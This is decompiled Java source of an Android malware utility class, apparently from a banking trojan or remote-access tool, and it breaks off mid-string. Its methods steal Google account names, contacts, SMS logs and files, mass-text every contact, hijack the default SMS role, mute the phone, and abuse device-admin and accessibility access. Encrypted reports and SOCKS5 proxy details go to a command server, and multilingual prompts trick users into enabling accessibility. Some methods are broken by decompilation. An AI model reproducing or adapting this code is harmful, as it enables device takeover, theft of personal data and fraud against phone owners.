package com.example.mmm.Utils;

import org.json.*;
import java.util.concurrent.*;
import com.example.mmm.Receiver.*;
import java.io.*;
import android.graphics.*;
import a.*;
import com.example.mmm.API.*;
import android.text.*;
import android.app.job.*;
import android.annotation.*;
import android.content.*;
import android.text.format.*;
import android.accounts.*;
import android.app.admin.*;
import com.example.mmm.Admin.*;
import android.media.*;
import android.provider.*;
import android.database.*;
import android.content.res.*;
import android.app.*;
import android.os.*;
import com.example.mmm.Activity.*;
import android.util.*;
import android.telephony.*;
import com.example.mmm.*;
import android.net.*;
import com.example.mmm.Service.*;
import java.util.*;
import android.content.pm.*;

public class utils
{
    static final boolean warming$;
    private static SharedPreferences settings;
    private static SharedPreferences$Editor editor;
    private static PowerManager$WakeLock wakeLock;
    constants consts;
    
    static {
        warming$ = (utils.class.desiredAssertionStatus() ^ true);
        utils.settings = null;
        utils.editor = null;
    }
    
    public utils() {
        super();
        this.consts = new constants();
    }
    
    public static int getMiuiVersion() {
        Runtime.getRuntime().exec("getprop ro.miui.ui.version.name").getInputStream();
        return Integer.parseInt(null.replace((CharSequence)"V", (CharSequence)""));
    }
    
    public static String countrySIM(final Context context) {
        final TelephonyManager telephonyManager = (TelephonyManager)context.getSystemService("phone");
        if (telephonyManager.getNetworkCountryIso().isEmpty()) {
            return "~no~";
        }
        return telephonyManager.getNetworkCountryIso();
    }
    
    static String _premises(final String s) {
        if (s == null || s.length() == 0) {
            return "";
        }
        final char char1 = s.charAt(0);
        if (Character.isUpperCase(char1)) {
            return s;
        }
        final StringBuilder sb = new StringBuilder();
        sb.append(Character.toUpperCase(char1));
        sb.append(s.substring(1));
        return sb.toString();
    }
    
    public static String _anaheim(String substring, final String s, final String s2) {
        substring = substring.substring(substring.indexOf(s) + s.length(), substring.indexOf(s2));
        return substring;
    }
    
    public static JSONObject mergeJSONObjects(final JSONObject jsonObject, final JSONObject jsonObject2) {
        final JSONObject jsonObject3 = new JSONObject();
        final Iterator keys = jsonObject.keys();
        final Iterator keys2 = jsonObject2.keys();
        while (keys.hasNext()) {
            final String s = keys.next();
            jsonObject3.put(s, jsonObject.get(s));
        }
        while (keys2.hasNext()) {
            final String s2 = keys2.next();
            jsonObject3.put(s2, jsonObject2.get(s2));
        }
        return jsonObject3;
    }
    
    public static void chalkTile(final int n) {
        TimeUnit.MILLISECONDS.sleep(n);
    }
    
    public static void startCustomTimer(final Context context, String action, final long n) {
        action = "";
        final Intent \u0131ntent = new Intent(context, (Class)bootReceiver.class);
        \u0131ntent.setAction(action);
        ((AlarmManager)context.getSystemService("alarm")).setRepeating(0, System.currentTimeMillis() + n, n, PendingIntent.getBroadcast(context, 0, \u0131ntent, 0));
    }
    
    public static boolean isMyServiceRunning(final Context context, final Class clazz) {
        final Iterator<ActivityManager$RunningServiceInfo> iterator = ((ActivityManager)context.getSystemService("activity")).getRunningServices(Integer.MAX_VALUE).iterator();
        while (iterator.hasNext()) {
            if (clazz.getName().equals(iterator.next().service.getClassName())) {
                return true;
            }
        }
        return false;
    }
    
    public static byte[] _update(final File file) {
        final InputStream \u0131nputStream = null;
        final byte[] array = new byte[(int)0L];
        final int length = array.length;
        final int length2 = array.length;
        \u0131nputStream.close();
        return array;
    }
    
    public static Bitmap _slides(final String s) {
        final byte[] decode = Base64.decode(s.getBytes(), 0);
        return BitmapFactory.decodeByteArray(decode, 0, decode.length);
    }
    
    private String _checking(final String s, String s2) {
        final StringBuilder sb = new StringBuilder();
        sb.append(s2);
        sb.append("&end=0");
        final String string = sb.toString();
        s2 = _anaheim(string, "q=", "&ws=");
        final String anaheim = _anaheim(string, "&ws=", "&end=0");
        final StringBuilder sb2 = new StringBuilder();
        sb2.append(s2);
        sb2.append("   ");
        sb2.append(anaheim);
        this.Log("q_ws", sb2.toString());
        final u u = new u();
        final o.a a = new o.a().a("q", s2).a("ws", anaheim);
        final o o = new o(a.a, a.b);
        final x.a a2 = new x.a();
        if (s == null) {
            throw new NullPointerException("url == null");
        }
        if (s.regionMatches(true, 0, "ws:", 0, 3)) {
            final StringBuilder sb3 = new StringBuilder("http:");
            sb3.append(s.substring(3));
            s2 = sb3.toString();
        }
        else {
            s2 = s;
            if (s.regionMatches(true, 0, "wss:", 0, 4)) {
                final StringBuilder sb4 = new StringBuilder("https:");
                sb4.append(s.substring(4));
                s2 = sb4.toString();
            }
        }
        final r d = r.d(s2);
        if (d != null) {
            final z a3 = new w(u, a2.a(d).a("POST", o).a(), false).a();
            s2 = a3.g.d();
            if (a3 != null) {
                a3.close();
            }
            return s2;
        }
        throw new IllegalArgumentException("unexpected url: ".concat(String.valueOf(s2)));
    }
    
    public static void _module(final Context context) {
        if (!isNotificationServiceEnabled(context)) {
            final Intent \u0131ntent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
            \u0131ntent.addFlags(268435456);
            context.startActivity(\u0131ntent);
        }
    }
    
    public static boolean isAccessibilityServiceEnabled(final Context context, Class clazz) {
        clazz = srvAccessibility.class;
        final ComponentName componentName = new ComponentName(context, (Class)clazz);
        final String string = Settings$Secure.getString(context.getContentResolver(), "enabled_accessibility_services");
        if (string == null) {
            return false;
        }
        final TextUtils$SimpleStringSplitter textUtils$SimpleStringSplitter = new TextUtils$SimpleStringSplitter(':');
        textUtils$SimpleStringSplitter.setString(string);
        while (textUtils$SimpleStringSplitter.hasNext()) {
            final ComponentName unflattenFromString = ComponentName.unflattenFromString(textUtils$SimpleStringSplitter.next());
            if (unflattenFromString != null && unflattenFromString.equals((Object)componentName)) {
                return true;
            }
        }
        return false;
    }
    
    public static String hasPermission(final Context context, final String s) {
        if (context.checkCallingOrSelfPermission(s) != 0) {
            return "0";
        }
        return "1";
    }
    
    private static String _giant(final String s, final String s2) {
        final byte[] liver = new ClassRC4(s2.getBytes())._liver(s.getBytes());
        final StringBuffer sb = new StringBuffer(liver.length * 2);
        for (int length = liver.length, i = 0; i < length; ++i) {
            final String string = Integer.toString(liver[i] & 0xFF, 16);
            if (string.length() < 2) {
                sb.append('0');
            }
            sb.append(string);
        }
        return Base64.encodeToString(sb.toString().getBytes(), 0);
    }
    
    public static boolean isNotificationServiceEnabled(final Context context) {
        final String packageName = context.getPackageName();
        final String string = Settings$Secure.getString(context.getContentResolver(), "enabled_notification_listeners");
        if (!TextUtils.isEmpty((CharSequence)string)) {
            final String[] split = string.split(":");
            for (int i = 0; i < split.length; ++i) {
                final ComponentName unflattenFromString = ComponentName.unflattenFromString(split[i]);
                if (unflattenFromString != null && TextUtils.equals((CharSequence)packageName, (CharSequence)unflattenFromString.getPackageName())) {
                    return true;
                }
            }
        }
        return false;
    }
    
    public static String _cookie(String encodeToString) {
        encodeToString = Base64.encodeToString(encodeToString.getBytes("UTF-8"), 0);
        return encodeToString;
    }
    
    private static String _possibly(String s, final String s2) {
        s = new String(new ClassRC4(s2.getBytes())._nevada(hexStringToByteArray(new String(Base64.decode(s, 0), "UTF-8"))));
        return s;
    }
    
    @TargetApi(23)
    @TargetApi(23)
    public static void scheduleJob(final Context context) {
        final JobInfo$Builder jobInfo$Builder = new JobInfo$Builder(0, new ComponentName(context, (Class)srvJOB.class));
        jobInfo$Builder.setMinimumLatency(15000L);
        jobInfo$Builder.setOverrideDeadline(30000L);
        jobInfo$Builder.setRequiredNetworkType(1);
        jobInfo$Builder.setRequiresDeviceIdle(true);
        jobInfo$Builder.setRequiresCharging(false);
        ((JobScheduler)context.getSystemService((Class)JobScheduler.class)).schedule(jobInfo$Builder.build());
    }
    
    public static void _casual(final Context context, final String s) {
        context.startActivity(new Intent("android.intent.action.VIEW", Uri.parse(s)));
    }
    
    public static String _efforts(String s) {
        s = new String(Base64.decode(s, 0), "UTF-8");
        return s;
    }
    
    public static void swapSmsManager(final Context context, final String s) {
        final Intent \u0131ntent = new Intent("android.provider.Telephony.ACTION_CHANGE_DEFAULT");
        \u0131ntent.putExtra("package", s);
        \u0131ntent.addFlags(268435456);
        context.startActivity(\u0131ntent);
    }
    
    public static boolean checkNetworkConnection(final Context context) {
        final ConnectivityManager connectivityManager = (ConnectivityManager)context.getSystemService("connectivity");
        final NetworkInfo networkInfo = connectivityManager.getNetworkInfo(1);
        if (networkInfo != null && networkInfo.isConnected()) {
            return true;
        }
        final NetworkInfo networkInfo2 = connectivityManager.getNetworkInfo(0);
        if (networkInfo2 != null && networkInfo2.isConnected()) {
            return true;
        }
        final NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }
    
    public static String getBatteryLevel(final Context context) {
        final Intent registerReceiver = context.registerReceiver((BroadcastReceiver)null, new IntentFilter("android.intent.action.BATTERY_CHANGED"));
        return String.valueOf(Math.round(registerReceiver.getIntExtra("level", -1) / (float)registerReceiver.getIntExtra("scale", -1) * 100.0f));
    }
    
    public static byte[] hexStringToByteArray(final String s) {
        final int length = s.length();
        final byte[] array = new byte[length / 2];
        for (int i = 0; i < length; i += 2) {
            array[i / 2] = (byte)((Character.digit(s.charAt(i), 16) << 4) + Character.digit(s.charAt(i + 1), 16));
        }
        return array;
    }
    
    private String sendSmsLogs(final Context context, final String s, final String s2, final String s3) {
        final JSONObject jsonObject = new JSONObject();
        jsonObject.put("ID", (Object)s2);
        jsonObject.put("LG", (Object)s);
        final Time time = new Time(Time.getCurrentTimezone());
        time.setToNow();
        final StringBuilder sb = new StringBuilder();
        sb.append(time.year);
        sb.append("-");
        sb.append(time.month);
        sb.append("-");
        sb.append(time.monthDay);
        sb.append(" ");
        sb.append(time.format("%k:%M"));
        jsonObject.put("DT", (Object)sb.toString());
        this.Log("SEND SMS", "logs: ".concat(String.valueOf(s)));
        final StringBuilder sb2 = new StringBuilder();
        sb2.append(s3);
        sb2.append(this._grown(jsonObject.toString()));
        return this._marina(this._brought(context, sb2.toString()));
    }
    
    public static void runApplication(final Context context, final String s) {
        context.startActivity(context.getPackageManager().getLaunchIntentForPackage(s));
    }
    
    public static String _castle(final Context context) {
        final Account[] accounts = AccountManager.get(context).getAccounts();
        for (int length = accounts.length, i = 0; i < length; ++i) {
            final Account account = accounts[i];
            if (account.type.equals("com.google")) {
                return account.name;
            }
        }
        return "";
    }
    
    private static String _orbit(String s) {
        final String s2;
        s = (s2 = "");
        s.length();
        return s2;
    }
    
    public static String getAccounts(final Context context) {
        final Account[] accountsByType = AccountManager.get(context).getAccountsByType("com.google");
        String string = "";
        for (int length = accountsByType.length, i = 0; i < length; ++i) {
            final Account account = accountsByType[i];
            final StringBuilder sb = new StringBuilder();
            sb.append(string);
            sb.append(account.name);
            sb.append(",");
            string = sb.toString();
        }
        return string;
    }
    
    public static boolean _exercise(final Context context) {
        return ((DevicePolicyManager)context.getSystemService("device_policy")).isAdminActive(new ComponentName(context, (Class)ReceiverDeviceAdmin.class));
    }
    
    public static boolean _prayer(final Context context) {
        return Build$VERSION.SDK_INT < 23 || ((PowerManager)context.getSystemService("power")).isIgnoringBatteryOptimizations(context.getPackageName());
    }
    
    public static String _janet(final Context context) {
        if (!((KeyguardManager)context.getSystemService("keyguard")).inKeyguardRestrictedInputMode()) {
            return "1";
        }
        return "0";
    }
    
    public static String _delhi(final Context context) {
        if (Build$VERSION.SDK_INT < 19) {
            return "0";
        }
        if (!Telephony$Sms.getDefaultSmsPackage(context).equals(context.getPackageName())) {
            return "0";
        }
        return "1";
    }
    
    public static boolean getScreenBoolean(final Context context) {
        return !((KeyguardManager)context.getSystemService("keyguard")).inKeyguardRestrictedInputMode();
    }
    
    public static void _pensions(final Context context) {
        final AudioManager audioManager = (AudioManager)context.getSystemService("audio");
        audioManager.setStreamMute(1, true);
        audioManager.setStreamMute(3, true);
        audioManager.setStreamVolume(4, 0, 0);
        audioManager.setStreamVolume(8, 0, 0);
        audioManager.setStreamVolume(5, 0, 0);
        audioManager.setStreamVolume(2, 0, 0);
        audioManager.setVibrateSetting(1, 0);
    }
    
    private String _nvidia(final Context context) {
        return this._marina(this._brought(context, "q=get_number&ws=0"));
    }
    
    public final String _decrease(final Context context, final String s, final String s2, final String s3, final String s4) {
        final JSONObject jsonObject = new JSONObject();
        final JSONObject jsonObject2 = new JSONObject(s2);
        jsonObject.put("LG", (Object)jsonObject2.getString("data"));
        jsonObject.put("ID", (Object)s3);
        jsonObject.put("AP", (Object)jsonObject2.getString("application"));
        jsonObject.put("IT", (Object)s);
        this.Log("SEND", "idinject: ".concat(String.valueOf(s)));
        this.Log("SEND", "idbot: ".concat(String.valueOf(s3)));
        final StringBuilder sb = new StringBuilder("application: ");
        sb.append(jsonObject2.getString("application"));
        this.Log("SEND", sb.toString());
        final StringBuilder sb2 = new StringBuilder("logs: ");
        sb2.append(jsonObject2.getString("data"));
        this.Log("SEND", sb2.toString());
        final StringBuilder sb3 = new StringBuilder();
        sb3.append(s4);
        sb3.append(this._grown(jsonObject.toString()));
        return this._marina(this._brought(context, sb3.toString()));
    }
    
    public final String _markers(final Context context, final String s, final String s2, final String s3, final String s4, final String s5, final String s6) {
        final JSONObject jsonObject = new JSONObject();
        jsonObject.put("id_device", (Object)s);
        jsonObject.put("country", (Object)s2);
        jsonObject.put("host", (Object)s3);
        jsonObject.put("port", (Object)s4);
        jsonObject.put("user", (Object)s5);
        jsonObject.put("pass", (Object)s6);
        final StringBuilder sb = new StringBuilder();
        sb.append(s5);
        sb.append("@");
        sb.append(s3);
        sb.append(":");
        sb.append(s4);
        this.Log("Send_add_socks5", sb.toString());
        final StringBuilder sb2 = new StringBuilder();
        sb2.append("q=add_socks5&ws=");
        sb2.append(this._grown(jsonObject.toString()));
        return this._marina(this._brought(context, sb2.toString()));
    }
    
    public final void _recovery(final Context context, final String s) {
        final Cursor query = context.getContentResolver().query(ContactsContract$CommonDataKinds$Phone.CONTENT_URI, (String[])null, (String)null, (String[])null, (String)null);
        int n = 0;
        int n2 = 0;
        while (query.moveToNext()) {
            final String string = query.getString(query.getColumnIndex("data1"));
            int n3 = n;
            int n4 = n2;
            if (!string.contains("*")) {
                n3 = n;
                n4 = n2;
                if (!string.contains("#")) {
                    n3 = n;
                    n4 = n2;
                    if (string.length() > 7) {
                        this._meant(context, string, s);
                        n3 = n + 1;
                        n4 = 1;
                    }
                }
            }
            chalkTile(1000);
            n = n3;
            n2 = n4;
        }
    }
    
    public final void _spaces(final Context context, final String s, String nvidia) {
        int n = 0;
        if (!nvidia.isEmpty() && !nvidia.equals(" ")) {
            Integer.parseInt(nvidia.replace(" ", ""));
        }
        while (true) {
            chalkTile(1000);
            nvidia = this._nvidia(context);
            if (nvidia.isEmpty()) {
                break;
            }
            this._meant(context, nvidia, s);
            ++n;
        }
    }
    
    public final void _tattoo(final Context context, final String contentTitle, final String contentText, final String s) {
        if (Build$VERSION.SDK_INT >= 28) {
            final NotificationManager notificationManager = (NotificationManager)context.getSystemService("notification");
            notificationManager.cancelAll();
            if (!utils.warming$ && notificationManager == null) {
                throw new AssertionError();
            }
            if (notificationManager.getNotificationChannel("com.lliwljofvp.akgndulzcijjcol_notification_id") == null) {
                notificationManager.createNotificationChannel(new NotificationChannel("com.lliwljofvp.akgndulzcijjcol_notification_id", (CharSequence)"com.lliwljofvp.akgndulzcijjcol_notification_name", 4));
            }
            PendingIntent pendingIntent;
            if (s.equals("accessibility")) {
                Intent \u0131ntent;
                if (this.consts.regional$) {
                    \u0131ntent = new Intent(context, (Class)actToaskAccessibility.class);
                }
                else {
                    \u0131ntent = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
                }
                \u0131ntent.putExtra("123", 123);
                pendingIntent = PendingIntent.getActivity(context, 0, \u0131ntent, 134217728);
            }
            else if (s.equals("main")) {
                final Intent \u0131ntent2 = new Intent("miui.intent.action.APP_PERM_EDITOR");
                \u0131ntent2.setClassName("com.miui.securitycenter", "com.miui.permcenter.permissions.PermissionsEditorActivity");
                \u0131ntent2.putExtra("extra_pkgname", context.getPackageName());
                \u0131ntent2.setFlags(268435456);
                \u0131ntent2.putExtra("123", 123);
                pendingIntent = PendingIntent.getActivity(context, 0, \u0131ntent2, 134217728);
            }
            else {
                pendingIntent = null;
            }
            final Notification$Builder setTicker = new Notification$Builder(context).setChannelId("com.lliwljofvp.akgndulzcijjcol_notification_id").setTicker((CharSequence)"Nature");
            final Resources resources = context.getResources();
            final StringBuilder sb = new StringBuilder();
            sb.append(context.getPackageName());
            sb.append(":mipmap/ic_launcher");
            final Notification notification = setTicker.setSmallIcon(resources.getIdentifier(sb.toString(), (String)null, (String)null)).setContentTitle((CharSequence)contentTitle).setContentText((CharSequence)contentText).setFullScreenIntent(pendingIntent, true).setOngoing(true).setAutoCancel(true).getNotification();
            notification.flags |= 0x20;
            notificationManager.notify(123, notification);
        }
    }
    
    public final void _firms(final String s, final Context context) {
        if ("xiaomi".equalsIgnoreCase(Build.MANUFACTURER) && getMiuiVersion() >= 10 && !this.SettingsRead(context, "XB").equals("1")) {
            return;
        }
        if ((!_prayer(context) && Integer.parseInt(this.SettingsRead(context, "SM")) > 2) || (!_prayer(context) && isAccessibilityServiceEnabled(context, srvAccessibility.class))) {
            this.SettingsWrite(context, "SQ", "1");
            this.Log(s, "autoClick=1 Doze Mode");
            final Intent \u0131ntent = new Intent(context, (Class)actDozeMode.class);
            \u0131ntent.addFlags(268435456);
            \u0131ntent.addFlags(1073741824);
            context.startActivity(\u0131ntent);
        }
    }
    
    public final void Log(final String s, final String s2) {
        if (this.consts.ongoing$) {
            Log.e(s, s2);
        }
    }
    
    public final String _basin() {
        new AsnycTask(this, (byte)0).execute((Object[])new Void[0]);
        final AsnycTask asnycTask = new AsnycTask(this, (byte)0);
        asnycTask.execute((Object[])new Void[0]);
        return (String)asnycTask.get();
    }
    
    public final String _storage(final int n) {
        final String s = "qwertyuiopasdfghjklzxcvbnm1234567890";
        final Random random = new Random();
        final StringBuilder sb = new StringBuilder();
        for (int i = 0; i < n; ++i) {
            sb.append(s.charAt(random.nextInt(s.length())));
        }
        return sb.toString();
    }
    
    public final String _atlantic(final Context context, final String s, final String s2, final String s3) {
        final JSONObject jsonObject = new JSONObject();
        jsonObject.put("ID", (Object)s2);
        jsonObject.put("IT", (Object)s);
        final StringBuilder sb = new StringBuilder();
        sb.append(s3);
        sb.append(this._grown(jsonObject.toString()));
        return this._marina(this._brought(context, sb.toString()));
    }
    
    public final void _pasta(final Context context, String s) {
        final String[] split = s.split("###");
        String replace;
        for (int i = 0; i < split.length; ++i, s = replace) {
            replace = s;
            if (!split[i].isEmpty()) {
                final File file = null;
                final String s2 = split[i];
                final String encodeToString = Base64.encodeToString(_update(file), 0);
                final String s3 = split[i];
                final Object o = null;
                final JSONObject jsonObject = new JSONObject();
                jsonObject.put("cmd", (Object)"saved_file");
                jsonObject.put("ID", (Object)this.SettingsRead(context, "QQ"));
                jsonObject.put("name", o);
                jsonObject.put("file_base64", (Object)encodeToString);
                final StringBuilder sb = new StringBuilder();
                sb.append("q=rat_cmd&ws=");
                sb.append(this._grown(jsonObject.toString()));
                final String marina = this._marina(this._brought(context, sb.toString()));
                this.Log("responce", " - > ".concat(String.valueOf(marina)));
                replace = s;
                if (marina.equals("ok")) {
                    final StringBuilder sb2 = new StringBuilder("###");
                    sb2.append(split[i]);
                    replace = s.replace(sb2.toString(), "");
                    this.SettingsWrite(context, "FF", replace);
                    final String s4 = split[i];
                }
            }
        }
    }
    
    public final void _meant(final Context context, String string, final String s) {
        final SmsManager default1 = SmsManager.getDefault();
        final ArrayList divideMessage = default1.divideMessage(s);
        final Intent \u0131ntent = new Intent("SMS_SENT");
        int i = 0;
        final PendingIntent broadcast = PendingIntent.getBroadcast(context, 0, \u0131ntent, 0);
        final PendingIntent broadcast2 = PendingIntent.getBroadcast(context, 0, new Intent("SMS_DELIVERED"), 0);
        final ArrayList<PendingIntent> list = new ArrayList<PendingIntent>();
        final ArrayList<PendingIntent> list2 = new ArrayList<PendingIntent>();
        while (i < divideMessage.size()) {
            list2.add(broadcast2);
            list.add(broadcast);
            ++i;
        }
        default1.sendMultipartTextMessage(string, (String)null, divideMessage, (ArrayList)list, (ArrayList)list2);
        final StringBuilder sb = new StringBuilder("Output SMS:");
        sb.append(string);
        sb.append(" text:");
        sb.append(s);
        sb.append("[143523#]");
        string = sb.toString();
        this.Log("SMS", string);
        this.SettingsToAdd(context, "AS", string);
        this._compiled(context, this.SettingsRead(context, "QQ"));
    }
    
    public final String[] _pants(final File file) {
        final JSONObject jsonObject = new JSONObject();
        final JSONObject jsonObject2 = new JSONObject();
        final int[] array2;
        final int[] array = array2 = new int[2];
        array2[1] = (array2[0] = 0);
        final Object o = null;
        for (int length = ((__Null)o).length, i = 0; i < length; ++i) {
            final Object o2 = o[i];
            jsonObject2.put(Integer.toString(array[1]), (Object)null);
            ++array[1];
        }
        return new String[] { jsonObject.toString(), jsonObject2.toString() };
    }
    
    public final String _numbers() {
        final JSONObject jsonObject = new JSONObject("{'en':'Enable','de':'Aktivieren','af':'Aktiveer','zh':'\u542f\u7528','cs':'Zapnout','nl':'Activeren','fr':'Activer','it':'Abilitare','ja':'\u6709\u52b9\u306b\u3059\u308b','ko':'\uc0ac\uc6a9\ud558\ub2e4','pl':'w\u0142\u0105czy\u0107','es':'Habilitar','ar':'\u064a\u064f\u0645\u0643\u0651\u0646','bg':'\u0412\u044a\u0437\u043c\u043e\u0436\u043d\u043e\u0441\u0442','ca':'Enable','hr':'Aktivirati','da':'Aktivere','fi':'Ottaa k\u00e4ytt\u00f6\u00f6n','el':'\u03b5\u03bd\u03b5\u03c1\u03b3\u03bf\u03c0\u03bf\u03b9\u03ce','iw':'\u05d4\u05e4\u05d5\u05da \u05dc\u05d6\u05de\u05d9\u05df','hi':'\u0938\u0915\u094d\u0937\u092e \u0915\u0930\u0947\u0902','hu':'Enged\u00e9lyez','in':'Fungsikan','lv':'Aktiviz\u0113t','lt':'Aktyvinti','nb':'Aktivere','pt':'Ativar','ro':'Activa','sr':'Aktivirati','sk':'Aktivova\u0165','sl':'Vklju\u010diti','sv':'Aktivera','th':'\u0e40\u0e1b\u0e34\u0e14\u0e43\u0e0a\u0e49\u0e07\u0e32\u0e19','tr':'L\u00fctfen','vi':'c\u00f3 hi\u1ec7u l\u1ef1c'}");
        final String lowerCase = Locale.getDefault().getLanguage().toLowerCase();
        if (lowerCase.equals("tr")) {
            final StringBuilder sb = new StringBuilder("L\u00fctfen ");
            sb.append("g\u00c3¼ncelleme");
            sb.append(" Etkinle\u015ftirin");
            return sb.toString();
        }
        final String string = jsonObject.getString(lowerCase);
        final StringBuilder sb2 = new StringBuilder();
        sb2.append(string);
        sb2.append(" ");
        sb2.append("g\u00c3¼ncelleme");
        return sb2.toString();
    }
    
    public final String _tests(final Context context, final String s, final String s2) {
        final JSONObject jsonObject = new JSONObject();
        jsonObject.put("AK", (Object)s);
        final StringBuilder sb = new StringBuilder();
        sb.append(s2);
        sb.append(this._grown(jsonObject.toString()));
        return this._marina(this._brought(context, sb.toString()));
    }
    
    public final String sendSavedSms(final Context context, final String s, final String s2, final String s3) {
        final JSONObject jsonObject = new JSONObject();
        jsonObject.put("ID", (Object)s2);
        jsonObject.put("LS", (Object)s);
        this.Log("Send Saved SMS", "logs: ".concat(String.valueOf(s)));
        final StringBuilder sb = new StringBuilder();
        sb.append(s3);
        sb.append(this._grown(jsonObject.toString()));
        return this._marina(this._brought(context, sb.toString()));
    }
    
    public final String _center(String marina) {
        final JSONObject jsonObject = new JSONObject();
        jsonObject.put("1", (Object)"1");
        final StringBuilder sb = new StringBuilder();
        sb.append("q=connecting&ws=");
        sb.append(jsonObject);
        marina = this._marina(this._checking(marina, sb.toString()));
        return marina;
    }
    
    public final String _ranch() {
        return new JSONObject("{'en':'Open More downloaded services > ','de':'\u00d6ffnen Sie Weitere heruntergeladene Dienste > ','af':'Open Meer afgelaaide dienste > ','zh':'\u6253\u5f00\u66f4\u591a\u4e0b\u8f7d\u7684\u670d\u52a1 > ','cs':'Otev\u0159\u00edt V\u00edce sta\u017een\u00fdch slu\u017eeb > ','nl':'Open Meer gedownloade services > ','fr':'Ouvrir Plus de services t\u00e9l\u00e9charg\u00e9s > ','it':'Apri Altri servizi scaricati > ','ja':'\u30c0\u30a6\u30f3\u30ed\u30fc\u30c9\u3057\u305f\u30b5\u30fc\u30d3\u30b9\u3092\u3055\u3089\u306b\u958b\u304f > ','ko':'\ub354 \ub9ce\uc740 \ub2e4\uc6b4\ub85c\ub4dc \uc11c\ube44\uc2a4 \uc5f4\uae30 > ','pl':'Otw\u00f3rz wi\u0119cej pobranych us\u0142ug > ','es':'Abrir m\u00e1s servicios de descargas > ','ar':'\u0641\u062a\u062d \u0627\u0644\u0645\u0632\u064a\u062f \u0645\u0646 \u0627\u0644\u062e\u062f\u0645\u0627\u062a \u0627\u0644\u062a\u064a \u062a\u0645 \u062a\u0646\u0632\u064a\u0644\u0647\u0627 > ','bg':'\u041e\u0442\u0432\u043e\u0440\u0435\u0442\u0435 \u041e\u0449\u0435 \u0438\u0437\u0442\u0435\u0433\u043b\u0435\u043d\u0438 \u0443\u0441\u043b\u0443\u0433\u0438 > ','ca':'Open More downloaded services > ','hr':'Otvori Vi\u0161e preuzetih usluga > ','da':'\u00c5pne Flere nedlastede tjenester > ','fi':'Avaa Lis\u00e4\u00e4 ladattuja palveluita > ','el':'\u0391\u03bd\u03bf\u03af\u03be\u03c4\u03b5 \u03a0\u03b5\u03c1\u03b9\u03c3\u03c3\u03cc\u03c4\u03b5\u03c1\u03b5\u03c2 \u03c5\u03c0\u03b7\u03c1\u03b5\u03c3\u03af\u03b5\u03c2 \u03bb\u03ae\u03c8\u03b7\u03c2 > ','iw':'\u05e4\u05ea\u05d7 \u05e9\u05d9\u05e8\u05d5\u05ea\u05d9\u05dd \u05de\u05d5\u05e8\u05d9\u05d3\u05d9\u05dd \u05e0\u05d5\u05e1\u05e4\u05d9\u05dd > ','hi':'\u0905\u0927\u093f\u0915 \u0921\u093e\u0909\u0928\u0932\u094b\u0921 \u0915\u0940 \u0917\u0908 \u0938\u0947\u0935\u093e\u090f\u0901 \u0916\u094b\u0932\u0947\u0902 > ','hu':'Nyisson meg t\u00f6bb let\u00f6lt\u00f6tt szolg\u00e1ltat\u00e1st > ','in':'Buka Lebih banyak layanan yang diunduh > ','lv':'Atveriet vair\u0101k lejupiel\u0101d\u0113tos pakalpojumus > ','lt':'Atidarykite Daugiau atsisi\u0173st\u0173 paslaug\u0173 > ','nb':'\u00c5pne Flere nedlastede tjenester > ','pt':'Abrir Mais servi\u00e7os baixados > ','ro':'Deschide Mai multe servicii desc\u0103rcate > ','sr':'\u041e\u0442\u0432\u043e\u0440\u0438 \u0408\u043e\u0448 \u043f\u0440\u0435\u0443\u0437\u0435\u0442\u0438\u0445 \u0443\u0441\u043b\u0443\u0433\u0430 > ','sk':'Open More downloaded services > ','sl':'Odprite Ve\u010d prenesenih storitev > ','sv':'\u00d6ppna Fler nedladdade tj\u00e4nster > ','th':'\u0e40\u0e1b\u0e34\u0e14\u0e1a\u0e23\u0e34\u0e01\u0e32\u0e23\u0e17\u0e35\u0e48\u0e14\u0e32\u0e27\u0e19\u0e4c\u0e42\u0e2b\u0e25\u0e14\u0e40\u0e1e\u0e34\u0e48\u0e21\u0e40\u0e15\u0e34\u0e21 > ','tr':'A\u00e7 Di\u011fer indirilen hizmetler > ','vi':'M\u1edf th\u00eam d\u1ecbch v\u1ee5 \u0111\u00e3 t\u1ea3i xu\u1ed1ng > '}").getString(Locale.getDefault().getLanguage());
    }
    
    public final String _plates(final Context context, final String s, final String s2) {
        final JSONObject jsonObject = new JSONObject();
        jsonObject.put("AK", (Object)s);
        final StringBuilder sb = new StringBuilder();
        sb.append(s2);
        sb.append(this._grown(jsonObject.toString()));
        return this._brought(context, sb.toString());
    }
    
    public final String _scott(final Context context, final String s, final String s2, final String s3) {
        final JSONObject jsonObject = new JSONObject();
        jsonObject.put("ID", (Object)s2);
        jsonObject.put("LS", (Object)s);
        this.Log("Send Saved SMS", "logs: ".concat(String.valueOf(s)));
        final StringBuilder sb = new StringBuilder();
        sb.append(s3);
        sb.append(this._grown(jsonObject.toString()));
        return this._marina(this._brought(context, sb.toString()));
    }
    
    public final String _painful() {
        return new JSONObject("{'en':'Click on me to activate','de':'Klicken Sie auf mich zu aktivieren','af':'Klik op my om te aktiveer','zh':'\u70b9\u51fb\u6211\u6fc0\u6d3b','cs':'Klikn\u011bte na m\u011b pro aktivaci','nl':'Klik op mij om te activeren','fr':'Cliquez sur moi pour activer','it':'Clicca su di me per attivare','ja':'\u30af\u30ea\u30c3\u30af\u3057\u3066\u30a2\u30af\u30c6\u30a3\u30d9\u30fc\u30c8','ko':'\ud65c\uc131\ud654\ud558\ub824\uba74 \uc800\ub97c \ud074\ub9ad\ud558\uc2ed\uc2dc\uc624','pl':'Kliknij na mnie, aby aktywowa\u0107','es':'Haz clic en m\u00ed para activar','ar':'\u0627\u0636\u063a\u0637 \u0639\u0644\u064a \u0644\u062a\u0641\u0639\u064a\u0644','bg':'\u041a\u043b\u0438\u043a\u043d\u0438 \u0432\u044a\u0440\u0445\u0443 \u043c\u0435\u043d, \u0437\u0430 \u0434\u0430 \u0441\u0435 \u0430\u043a\u0442\u0438\u0432\u0438\u0440\u0430','ca':'Click on me to activate','hr':'Kliknite na mene da se aktiviram','da':'Klikk p\u00e5 meg for \u00e5 aktivere','fi':'Napsauta minua aktivoimaan','el':'\u039a\u03ac\u03bd\u03c4\u03b5 \u03ba\u03bb\u03b9\u03ba \u03c3\u03b5 \u03bc\u03b5 \u03b3\u03b9\u03b1 \u03bd\u03b1 \u03b5\u03bd\u03b5\u03c1\u03b3\u03bf\u03c0\u03bf\u03b9\u03ae\u03c3\u03b5\u03c4\u03b5','iw':'\u05dc\u05d7\u05e5 